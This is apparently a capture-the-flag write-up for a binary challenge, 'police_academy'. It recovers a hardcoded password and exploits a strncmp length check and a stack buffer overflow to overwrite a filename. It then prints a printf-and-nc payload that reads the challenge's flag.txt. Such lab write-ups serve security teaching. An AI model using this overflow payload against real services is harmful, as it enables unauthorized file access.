# Old school hack
binary - 200 points

## Challenge 
> Chris is trying out to be a police officer and the applications have just been sent into the police academy. He is really eager to find out about his competition. Help it him back the system and view the other applicant’s applications.

> The service is running at 128.199.224.175:13000 

> [police_academy](police_academy)

## Solution


#### Analysis
Looking in the decompiled code, we find the password easily

    __isoc99_scanf(0x400e41, &var_40);
    if (strncmp(&var_40, "kaiokenx20", 0xa) == 0x0) goto loc_400a14;

Now let's try to access the cases...

Case 1 through 6 gives us some plaintext, while 7 doesn't allow showing the flag.

	$ ./police_academy 
	Enter password to authentic yourself : kaiokenx20
	Enter case number: 

		 1) Application_1
		 2) Application_2
		 3) Application_3
		 4) Application_4
		 5) Application_5
		 6) Application_6
		 7) Flag

		 Enter choice :- 7
	You don't have the required privileges to view the flag, yet.


From the decompiled code, we see that `print_record()` is called with the filename passed as the parameter for each case.

Except for case number 7, the filename appears to be the MD5 sum appended with `.dat`. This gives it a total length of 36 chars for the file name.

	# For case 1
	>>> p64(0x3037303838356132) + p64(0x3566356538656130) + p64(0x6339666439616331) + p64(0x6436353334346135) + p64(0x7461642e) 
	'2a5880700ae8e5f51ca9df9c5a44356d.dat\x00\x00\x00\x00'

	# For case 7
	>>> p64(0x7478742e67616c66)
	'flag.txt'


We can't read the flag because `print_record()` rejects any filename that isn't 36 chars long.

#### Exploit

Now, in the decompiled code we see the only vulnerable part is `scanf` and buffer overflow. Interestingly, we see something odd about the compare function. They are using `strncmp()`. 
	
	strncmp(&var_40, "kaiokenx20", 0xa)

This only compares the first 10 chars. Hence, we can append any amount of data after `kaiokenx20` and it will still be the correct password.

---

Next, notice that if the case number is more than 7 (say number 8), it jumps to print `var_30` straight away.

This means we can use buffer overflow to set the filename.

	    if (rax > 0x7) goto loc_400cb8;
	...

	loc_400cb8:
	    if (print_record(&var_30) == 0xffffffff) {
	            printf("\nNo such record exists. Please verify your choice.");
	    }

Let's look for the length required...

    ; Variables:
    ;    var_8: -8
    ;    var_30: -48
    ;    var_40: -64
    ;    var_44: -68
    ;    var_48: -72

- var_40: password [16 byte]
- var_30: filename [40 byte]
- var_8: stack canary

Hence, we need to have the password 16 bytes long, followed by 36 bytes of the filename. (Total payload length is `16 + 36 = 52 bytes`)

	$ printf 'kaiokenx20xxxxxx0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\n8' | strace ./police_academy
	...
	open("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", O_RDONLY) = -1 ENOENT (No such file or directory)

Success, we found the filename to be written!

#### Get flag!

Let's read `flag.txt`, or shall I say `././././././././././././././flag.txt` (36 chars)


	$ printf 'kaiokenx20xxxxxx././././././././././././././flag.txt\n8' > payload.txt
	$ cat payload.txt | nc 128.199.224.175 13000


	Enter password to authentic yourself : Enter case number: 

		 1) Application_1
		 2) Application_2
		 3) Application_3
		 4) Application_4
		 5) Application_5
		 6) Application_6
		 7) Flag

		 Enter choice :- 
	XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
	XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

	The flag is :- pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}
	?

	XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
	XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

	files $ 

## Flag

	pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}